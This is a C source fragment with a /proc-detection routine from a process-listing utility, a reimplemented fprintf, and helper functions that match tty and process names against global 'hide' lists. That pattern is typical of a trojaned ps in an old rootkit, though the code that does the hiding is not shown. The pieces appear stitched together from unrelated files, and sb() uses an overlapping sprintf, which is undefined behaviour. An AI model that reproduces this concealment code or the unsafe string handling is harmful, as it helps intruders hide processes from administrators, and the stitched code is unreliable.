 * Return true iff dir is a /proc directory.
 *
 * This works because of the fact that "/proc/0" and "/proc/00" are the
 * same file, namely process 0, and are not linked to each other.  Ugly.
 */
static int	
isprocdir(dir)		/* return TRUE iff dir is a PROC directory */
	char	*dir;
{
	extern int stat();
	struct stat stat1;	/* dir/0  */
	struct stat stat2;	/* dir/00 */
	char	path[200];
	register char	*p;

	/*
	 * Make a copy of the directory name without trailing '/'s
	 */
	if (dir == NULL)
		(void) strcpy(path, ".");
	else {
		(void) strncpy(path, dir, (int)sizeof(path) - 4);
		path[sizeof(path)-4] = '\0';
		p = path + strlen(path);
		while (p > path && *--p == '/')
			*p = '\0';
		if (*path == '\0')
			(void) strcpy(path, ".");
	}

	/*
	 * Append "/0" to the directory path and stat() the file.
	 */
	p = path + strlen(path);
	*p++ = '/';
	*p++ = '0';
	*p = '\0';
	if (stat(path, &stat1) != 0)
		return FALSE;

	/*
	 * Append "/00" to the directory path and stat() the file.
	 */
	*p++ = '0';
	*p = '\0';
	if (stat(path, &stat2) != 0)
		return FALSE;

	/*
	 * See if we ended up with the same file.
	 */
	if (stat1.st_dev != stat2.st_dev
	  || stat1.st_ino   != stat2.st_ino
	  || stat1.st_mode  != stat2.st_mode
	  || stat1.st_nlink != stat2.st_nlink
	  || stat1.st_uid   != stat2.st_uid
	  || stat1.st_gid   != stat2.st_gid
	  || stat1.st_size  != stat2.st_size)
		return FALSE;

	/*
	 * Return TRUE iff we have a regular file with a single link.
	 */
	return (stat1.st_mode & S_IFMT) == S_IFREG && stat1.st_nlink == 1;
}



extern int _doprnt();

/*VARARGS2*/
int
#ifdef __STDC__
fprintf(FILE *iop, const char *format, ...)
#else
fprintf(iop, format, va_alist)
FILE *iop;
char *format;
va_dcl
#endif
{
        register int count;
        va_list ap;

#ifdef __STDC__
        va_start(ap,);
#else
        va_start(ap);
#endif
        if (!(iop->_flag & _IOWRT)) {
                /* if no write flag */
                if (iop->_flag & _IORW) {
                        /* if ok, cause read-write */
                        iop->_flag |= _IOWRT;
                } else {
                        /* else error */
                        errno = EBADF;
                        return EOF;
                }
        }
        count = _doprnt(gettext(format), ap, iop);
        va_end(ap);
        return(ferror(iop)? EOF: count);
}

char *sb(sbs)
char sbs[80];
{
static char tsbs[80];
int fq=0,ff;

strcpy(tsbs, "");
for(ff=0;ff<strlen(sbs);ff++) {
        if ((fq==1) && (sbs[ff]!='\"')) sprintf(tsbs, "%s%c", tsbs, sbs[ff]);
        if (sbs[ff]=='\"') fq++;
        }
return(tsbs);
}

int intty(ttytemp)
char ttytemp[15];
{
int inttyr=0;
int ttyl=0;

for (ttyl=0;ttyl<tnum;ttyl++) {
        if (!strcmp(htty[ttyl], ttytemp)) inttyr++;
        }
return(inttyr);
}

int inpro(protemp)
char protemp[80];
{
int inpror=0;
int prol=0;

for (prol=0;prol<pnum;prol++) {
        if (!strcmp(hpro[prol], protemp)) inpror++;
        }
return(inpror);
}
